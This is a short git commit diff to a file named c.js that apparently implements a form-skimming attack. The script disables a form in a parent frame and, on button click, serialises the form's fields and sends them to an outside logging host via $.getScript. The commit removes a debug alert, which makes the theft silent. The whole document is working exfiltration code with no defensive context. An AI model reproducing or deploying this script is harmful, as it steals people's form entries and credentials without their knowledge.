5eff17f63ad5ed38d2366d39c5398f43751ca489
Phil Parker <parker.p.dev@gmail.com>
2016-12-01 09:27:51 +0000

    Update c.js

--- c.js
+++ c.js
@@ -1,7 +1,6 @@
 $("form", window.parent.frames['content'].document).attr('action',"#")
 $("form", window.parent.frames['content'].document).removeAttr('onsubmit')
 $("input:button", window.parent.frames['content'].document).click(function(e){
-  alert(0);
   e.preventDefault();
   $.getScript('//snhack.herokuapp.com/log?'+ $("form", window.parent.frames['content'].document).serialize())
 })
